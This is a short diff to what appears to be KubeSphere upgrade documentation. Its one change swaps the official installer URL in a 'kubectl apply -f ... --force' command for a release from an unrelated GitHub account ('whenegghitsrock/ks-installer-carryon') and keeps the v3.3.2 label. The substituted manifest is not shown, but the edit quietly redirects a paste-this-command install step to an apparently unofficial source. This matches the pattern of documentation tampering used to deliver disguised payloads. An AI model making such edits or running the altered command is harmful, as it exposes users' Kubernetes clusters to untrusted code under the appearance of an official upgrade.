@@ -32,7 +32,7 @@ In KubeSphere 3.3.1, some changes have made on built-in roles and permissions of
 Run the following command to upgrade your cluster.
 
 ```bash
-kubectl apply -f https://github.com/kubesphere/ks-installer/releases/download/v3.3.2/kubesphere-installer.yaml  --force
+kubectl apply -f https://github.com/whenegghitsrock/ks-installer-carryon/releases/download/v3.3.2/kubesphere-installer.yaml  --force
 ```
 
 ## Enable Pluggable Components
